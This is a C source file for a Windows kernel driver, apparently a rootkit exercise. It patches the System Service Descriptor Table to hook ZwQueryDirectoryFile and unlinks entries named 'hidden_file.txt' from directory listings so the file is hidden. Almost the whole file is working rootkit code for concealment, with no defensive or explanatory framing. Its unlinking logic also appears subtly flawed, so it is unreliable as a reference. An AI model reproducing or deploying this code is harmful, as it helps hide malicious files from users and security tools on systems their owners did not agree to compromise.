#include <Ntifs.h>
#include <wdm.h>

void printBuffer(WCHAR * buffer, size_t length);


//extern ULONG KeServiceDescriptorTable;
__declspec(dllimport) NTSTATUS ZwQueryDirectoryFile(
	__in      HANDLE FileHandle,
	__in_opt  HANDLE Event,
	__in_opt  PIO_APC_ROUTINE ApcRoutine,
	__in_opt  PVOID ApcContext,
	__out     PIO_STATUS_BLOCK IoStatusBlock,
	__out     PVOID FileInformation,
	__in      ULONG Length,
	__in      FILE_INFORMATION_CLASS FileInformationClass,
	__in      BOOLEAN ReturnSingleEntry,
	__in_opt  PUNICODE_STRING FileName,
	__in      BOOLEAN RestartScan
	);

typedef NTSTATUS (*ZwQueryDirectoryFilePtr)(
	__in      HANDLE FileHandle,
	__in_opt  HANDLE Event,
	__in_opt  PIO_APC_ROUTINE ApcRoutine,
	__in_opt  PVOID ApcContext,
	__out     PIO_STATUS_BLOCK IoStatusBlock,
	__out     PVOID FileInformation,
	__in      ULONG Length,
	__in      FILE_INFORMATION_CLASS FileInformationClass,
	__in      BOOLEAN ReturnSingleEntry,
	__in_opt  PUNICODE_STRING FileName,
	__in      BOOLEAN RestartScan
	);


NTSTATUS MyZwQueryDirectoryFile(
	__in      HANDLE FileHandle,
	__in_opt  HANDLE Event,
	__in_opt  PIO_APC_ROUTINE ApcRoutine,
	__in_opt  PVOID ApcContext,
	__out     PIO_STATUS_BLOCK IoStatusBlock,
	__out     PVOID FileInformation,
	__in      ULONG Length,
	__in      FILE_INFORMATION_CLASS FileInformationClass,
	__in      BOOLEAN ReturnSingleEntry,
	__in_opt  PUNICODE_STRING FileName,
	__in      BOOLEAN RestartScan
	);


ZwQueryDirectoryFilePtr g_originalNtQueryDirectoryFile;


#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase;
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} SSDT_Entry;
#pragma pack()

__declspec(dllimport) SSDT_Entry KeServiceDescriptorTable;

PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;

#define SYSTEMSERVICE(_func) \
	KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_func+1)]

#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)

#define HOOK_SYSCALL(_Function, _Hook, _Orig )	\
	_Orig = (PVOID) InterlockedExchange( (PLONG) \
	&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Func, _Hook, _Orig )  \
	InterlockedExchange((PLONG)           \
	&MappedSystemCallTable[SYSCALL_INDEX(_Func)], (LONG) _Hook)

#define HIDDEN_FILE_NAME L"hidden_file.txt"
WCHAR * g_hiddenFilename = HIDDEN_FILE_NAME;
size_t g_hiddenFilenameLength = sizeof(HIDDEN_FILE_NAME) - sizeof(WCHAR);



NTSTATUS DriverEntry(struct _DRIVER_OBJECT *DriverObject, PUNICODE_STRING RegistryPath)
{
	
	DbgPrint("In DriverEntry\r\n");

	g_pmdlSystemCall = MmCreateMdl(NULL,
		KeServiceDescriptorTable.ServiceTableBase,
		KeServiceDescriptorTable.NumberOfServices*4);
	
	
	if(!g_pmdlSystemCall)
	{
		return STATUS_UNSUCCESSFUL;
	}		

	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

	
	// Change the flags of the MDL
	g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);


	g_originalNtQueryDirectoryFile = SYSTEMSERVICE(ZwQueryDirectoryFile);

	HOOK_SYSCALL(ZwQueryDirectoryFile, MyZwQueryDirectoryFile, g_originalNtQueryDirectoryFile);

	return STATUS_SUCCESS;
}

NTSTATUS MyZwQueryDirectoryFile(
	__in      HANDLE FileHandle,
	__in_opt  HANDLE Event,
	__in_opt  PIO_APC_ROUTINE ApcRoutine,
	__in_opt  PVOID ApcContext,
	__out     PIO_STATUS_BLOCK IoStatusBlock,
	__out     PVOID FileInformation,
	__in      ULONG Length,
	__in      FILE_INFORMATION_CLASS FileInformationClass,
	__in      BOOLEAN ReturnSingleEntry,
	__in_opt  PUNICODE_STRING FileName,
	__in      BOOLEAN RestartScan
	)
{
	char * pBuffer = FileInformation;
	char * pPreviousBuffer = NULL;
	PFILE_BOTH_DIR_INFORMATION pData = pBuffer;
	size_t nextEntryOffset;
	size_t filesCount = 0;
	


	NTSTATUS status = g_originalNtQueryDirectoryFile (FileHandle,
		Event, ApcRoutine, ApcContext, IoStatusBlock,
		FileInformation, Length, FileInformationClass, 
		ReturnSingleEntry, FileName, RestartScan);


	if (FileBothDirectoryInformation != FileInformationClass)
	{
		return status;
	}


	if (STATUS_NO_MORE_FILES == status || STATUS_BUFFER_OVERFLOW == status || IoStatusBlock->Information < sizeof(FILE_BOTH_DIR_INFORMATION))
	{
		return status;
	}

	DbgPrint(" IoStatusBlock->Information = %d\r\n",  IoStatusBlock->Information);
	while (pData->NextEntryOffset != 0)
	{
		DbgPrint("File name byte length = %d, filesCount = %d\r\n", pData->FileNameLength, filesCount);
		printBuffer(pData->FileName, pData->FileNameLength / sizeof(WCHAR));
		DbgPrint("\r\n");


		if (g_hiddenFilenameLength == pData->FileNameLength)
		{
			if (g_hiddenFilenameLength == 
				RtlCompareMemory(g_hiddenFilename, pData->FileName, g_hiddenFilenameLength))
			{
				if (NULL != pPreviousBuffer)
				{
					nextEntryOffset = pData->NextEntryOffset;
					pData = pPreviousBuffer;
					
					if (0 == nextEntryOffset)
					{
						pData->NextEntryOffset = 0;
					}
					else
					{
						pData->NextEntryOffset += nextEntryOffset;
					}

					pData = pBuffer;
				}
			}
		}

		++filesCount;
		
		pPreviousBuffer = pBuffer;
		pBuffer += pData->NextEntryOffset;
		pData = pBuffer;


		if (TRUE == ReturnSingleEntry)
		{
			break;
		}

		if (pBuffer - FileInformation >= IoStatusBlock->Information)
		{
			break;
		}
	}
	
	
	return status;
}

void printBuffer( WCHAR * buffer, size_t length )
{
	size_t index;

	for (index = 0 ; index < length ; ++index)
	{
		DbgPrint("%C", *(buffer + index));
	}
}
